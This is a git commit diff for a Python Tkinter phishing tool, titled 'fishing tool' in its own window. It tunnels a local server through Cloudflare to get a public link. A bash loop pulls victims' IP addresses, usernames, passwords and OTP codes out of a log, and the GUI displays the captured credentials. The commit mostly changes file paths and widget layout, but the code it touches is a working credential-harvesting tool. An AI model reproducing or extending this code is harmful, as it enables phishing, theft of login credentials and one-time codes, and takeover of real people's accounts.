df03556fe37dd786bcf4395b10347b64d1b7aa2e
Rupesh <rupesh54321kumar@gmail.com>
2022-03-27 18:34:23 +0000

    sociallink.py

--- assets/bashscript.sh
+++ assets/bashscript.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
+printf "" > assets/log.txt
+printf ""> process/username.txt
+printf ""> process/password.txt
+printf ""> process/otp.txt
 while true; do
 ip=$(cat assets/log.txt | grep 'IP:' | awk '{print $2}')
 username=$(cat assets/log.txt | grep 'Username:' | awk '{print $2}')
@@ -6,9 +10,9 @@ password=$(cat assets/log.txt | grep 'Password:' | awk '{print $2}')
 otp=$(cat assets/log.txt | grep 'OTP:' | awk '{print $2}')
 if [[ ! -z "$ip" && ! -z "$username" && ! -z "$password" && ! -z "$otp" ]]; then
 printf "$ip"> assets/process/ip.txt
-printf "$username"> assets/process/username.txt
-printf "$password"> assets/process/password.txt
-printf "$otp"> assets/process/otp.txt
+printf "$username"> process/username.txt
+printf "$password"> process/password.txt
+printf "$otp"> process/otp.txt
 break
 fi
 done
--- sociallink.py
+++ sociallink.py
@@ -4,10 +4,10 @@ from tkinter.ttk import *
 def sites():
 	def fish():
 		def linkwindow():
-			f = open("assets/process/new.txt")
+			f = open("process/new.txt")
 			copyplace.delete(0, END)
 			copyplace.insert(INSERT, f.read())
-		link = os.system("cd assets; hostit -f cloudflare 8080 > process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' 'process/link.txt' > process/new.txt; rm process/link.txt")
+		link = os.system("cd assets; hostit -f cloudflare 8080 > ../process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../process/link.txt' > ../process/new.txt; rm ../process/link.txt")
 		def capture():
 			file_size = os.path.getsize('assets/log.txt')
 			while True:
@@ -16,15 +16,15 @@ def sites():
 					os.system("bash assets/bashscript.sh")
 					break
 		def uname():
-			g= open("assets/process/username.txt")
+			g= open('process/username.txt', 'r')	 
 			unameplace.delete(0, END)
 			unameplace.insert(INSERT, g.read())
 		def pwget():
-			h = open("assets/process/password.txt")
+			h = open("process/password.txt")
 			pwarea.delete(0, END)
 			pwarea.insert(INSERT, h.read())
 		def otpget():
-			i = open("assets/process/otp.txt")
+			i = open("process/otp.txt")
 			otparea.delete(0, END)
 			otparea.insert(INSERT, i.read())
 		root3 = Tk()
@@ -36,25 +36,25 @@ def sites():
 		copybutton = Button(root3,text="copy link", command= linkwindow)
 		copybutton.grid(row=0, column=0)
 		
-		listener = Button(root3, text="start capturing", command=capture).grid(row=0,column=3)
+		listener = Button(root3, text="start capturing", command=capture).grid(row=1,column=0)
 	
 		
 		username = Button(root3,text="username", command= uname)
-		username.grid(row=1, column=0)
+		username.grid(row=2, column=0)
 		unameplace= Entry(root3, width=60, font="Calibri 10")
-		unameplace.grid(row=1, column=2)
+		unameplace.grid(row=2, column=2)
 		unameplace.insert(INSERT, "click username to update")
 		
 		pw = Button(root3,text="password", command= pwget)
-		pw.grid(row=2, column=0)
+		pw.grid(row=3, column=0)
 		pwarea = Entry(root3, width=60, font="Calibri 10")
-		pwarea.grid(row=2,column=2)
+		pwarea.grid(row=3,column=2)
 		pwarea.insert(INSERT, "click password to update")
 		
 		otp = Button(root3,text="OTP", command= otpget)
-		otp.grid(row=3, column=0)
+		otp.grid(row=4, column=0)
 		otparea = Entry(root3, width=60, font="Calibri 10")
-		otparea.grid(row=3,column=2)
+		otparea.grid(row=4,column=2)
 		otparea.insert(INSERT, "click OTP to update")
 		root3.mainloop()
 	root1 = Tk()
@@ -65,11 +65,11 @@ def sites():
 	root1.mainloop()
 os.system("""
 #!/bin/bash
-cd assets
 if [ -f process/new.txt ]; then
 rm process/new.txt
 fi
 	""")
+os.system("""if [ ! -d process ]; then mkdir -p process; fi""")
 root = Tk()
 root.geometry('300x200')
 root.title("fishing tool")
